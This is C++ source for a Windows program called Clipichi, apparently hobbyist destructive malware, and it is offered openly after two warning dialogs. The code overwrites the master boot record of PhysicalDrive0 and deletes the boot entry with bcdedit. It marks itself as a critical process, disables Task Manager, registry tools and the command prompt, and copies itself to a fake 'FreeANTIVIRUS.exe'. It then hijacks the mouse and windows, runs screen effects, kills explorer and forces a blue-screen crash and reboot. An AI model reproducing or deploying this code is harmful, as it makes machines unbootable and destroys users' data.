// Clipichi.cpp : Defines the entry point for the application.
//

// Clipichi.cpp : Defines the entry point for the application.
//

#include "Clipichi.h"
#include "gdi.h"
#include "sound.h"
#include "MBR.h"

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI BSODNULL(LPVOID lpParam)
{
	BOOLEAN bl;
	DWORD response;
	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &bl);
	ULONG_PTR args[] = { (ULONG_PTR)"NULL.sys - 0xNULL - [NULL]" };
	NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
	HANDLE token;
	TOKEN_PRIVILEGES privileges;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
	return 0;
}

HCRYPTPROV hProv;
int Random()
{
	if (!hProv)
		CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT);

	int out = 0;
	CryptGenRandom(hProv, sizeof(out), (BYTE*)(&out)); //Generate random number
	return out & 0x7FFFFFFF;
}

DWORD WINAPI antitbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
DWORD WINAPI OhNo2(LPVOID lpstart) {
	INPUT input;
	input.type = INPUT_MOUSE;

	while (true) {
		input.mi.dwFlags = (rand() % 2) ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_RIGHTUP;

		SendInput(1, &input, sizeof(INPUT));
		RtlZeroMemory(&input, sizeof(input));

		Sleep(rand() % 70 + 50);
	}
}
LPCWSTR generateRandomUnicodeString(int len) {
	wchar_t* ustr = new wchar_t[len + 1];  // +1 for '\0'
	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI moveself(LPVOID lpParam) {
	char pathdel[MAX_PATH];
	GetModuleFileNameA(NULL, pathdel, MAX_PATH);
	MoveFileA(pathdel, "C:\\Windows\\FreeANTIVIRUS.exe");
	return 1;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI OhNo(LPVOID lpstart) { //credits to Maxi2022gt, his github: https://github.com/Maxi2022gt
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true) {
		HWND wnd = GetForegroundWindow();
		MoveWindow(wnd, rand() % w, rand() % h, rand() % w, rand() % h, false);
		Sleep(rand() % 100);
	}
}
DWORD WINAPI shutdowns(LPVOID lpParam) {
	typedef ULONG32(WINAPI* lpNtShutdownSystem)(int Action);
	typedef ULONG32(WINAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	PVOID Info;
	HMODULE hModule;
	lpNtSetSystemPowerState NtSetSystemPowerState;
	lpNtShutdownSystem NtShutdownSystem;

	//Load ntdll.dll
	if ((hModule = LoadLibrary(_T("ntdll.dll"))) == 0) {
		return 1;
	}

	//Get functions
	NtShutdownSystem = (lpNtShutdownSystem)GetProcAddress(hModule, "NtShutdownSystem");
	if (NtShutdownSystem == NULL) {
		return 2;
	}
	NtSetSystemPowerState = (lpNtSetSystemPowerState)GetProcAddress(hModule, "NtSetSystemPowerState");
	if (NtSetSystemPowerState == NULL) {
		return 3;
	}

	// Get a token for this process
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return(FALSE);

	// Get the LUID for the shutdown privilege
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;  // one privilege to set	
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS) {
		return 4;
	}

	/*
	* Technically only NtSetSystemPowerState is needed to be called to power off a computer
	* Howver, I found at least one report of NtSetSystemPowerState not working while NtShutdownSystem does
	* https://www.autoitscript.com/forum/topic/149641-how-to-force-a-power-down/page/2/?tab=comments#comment-1166299
	* So the code calls NtSetSystemPowerState first, since in my tests it's a hair faster, and if that fails will call NtShutdownSystem as a fallback
	*/
	ULONG32 retNSSPS = NtSetSystemPowerState((POWER_ACTION)PowerSystemShutdown, (SYSTEM_POWER_STATE)PowerActionShutdown, 0);
	ULONG32 retNSS = NtShutdownSystem(2); //2 = ShutdownPowerOff
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090, cuz creating registry keys in C++ without shitty system() or reg.exe is hell
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}
int WINAPI WinMain(HINSTANCE hia,
	HINSTANCE his,
	LPSTR hiu,
	int hap) {
	CreateThread(0, 0, moveself, 0, 0, 0);
	if (MessageBoxW(NULL, L"Fair Warning!, Run A Malware For Sure?, \nAre you sure to run dangerous malware, you will unstable boot device,\n do you run during a malware, for an test malware? \n Are You Sure?", L"Clipichi.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"This Is The Last Warning!, Are You Sure? \nP. ĐĂNG will not be responsible for any of the damage caused!", L"Clipichi.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			system("bcdedit /delete {current}");
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, antitbar, 0, 0, 0);
			Sleep(5000);
			HANDLE gdi01 = CreateThread(0, 0, OhNo, 0, 0, 0);
			HANDLE gdi02 = CreateThread(0, 0, OhNo2, 0, 0, 0);
			HANDLE gdi1 = CreateThread(0, 0, p1::GDI, 0, 0, 0);
			sfx1();
			Sleep(30000);
			TerminateThread(gdi1, 0);
			CloseHandle(gdi1);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi2 = CreateThread(0, 0, p2::GDI, 0, 0, 0);
			sfx2();
			Sleep(30000);
			TerminateThread(gdi2, 0);
			CloseHandle(gdi2);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi3 = CreateThread(0, 0, p3::GDI, 0, 0, 0);
			HANDLE specialgdi = CreateThread(0, 0, GDIBALL, 0, 0, 0);
			sfx3();
			Sleep(30000);
			TerminateThread(gdi3, 0);
			CloseHandle(gdi3);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi4 = CreateThread(0, 0, p4::GDI, 0, 0, 0);
			sfx4();
			Sleep(30000);
			TerminateThread(gdi4, 0);
			CloseHandle(gdi4);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi5 = CreateThread(0, 0, p5::GDI, 0, 0, 0);
			HANDLE gdi5dot1 = CreateThread(0, 0, p5::GDI2, 0, 0, 0);
			sfx5();
			Sleep(30000);
			TerminateThread(gdi5, 0);
			CloseHandle(gdi5);
			TerminateThread(gdi5dot1, 0);
			CloseHandle(gdi5dot1);
			TerminateThread(specialgdi, 0);
			CloseHandle(specialgdi);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi6 = CreateThread(0, 0, p6::GDI, 0, 0, 0);
			HANDLE specialgdi2 = CreateThread(0, 0, textout3, 0, 0, 0);
			sfx6();
			Sleep(30000);
			TerminateThread(gdi6, 0);
			CloseHandle(gdi6);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi7 = CreateThread(0, 0, p7::GDI, 0, 0, 0);
			sfx7();
			Sleep(30000);
			TerminateThread(gdi7, 0);
			CloseHandle(gdi7);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi8 = CreateThread(0, 0, p8::GDI, 0, 0, 0);
			sfx8();
			Sleep(30000);
			TerminateThread(gdi8, 0);
			CloseHandle(gdi8);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE gdi9 = CreateThread(0, 0, p9::GDI, 0, 0, 0);
			sfx9();
			Sleep(30000);
			TerminateThread(gdi9, 0);
			CloseHandle(gdi9);
			TerminateThread(gdi01, 0);
			TerminateThread(gdi02, 0);
			CloseHandle(gdi01);
			CloseHandle(gdi02);
			TerminateThread(specialgdi2, 0);
			CloseHandle(specialgdi2);
			InvalidateRect(0, 0, 0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			// gdi end
			ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, SW_SHOWDEFAULT);
			CreateThread(0, 0, BSODNULL, 0, 0, 0);
			Sleep(-1);
		}
	}
}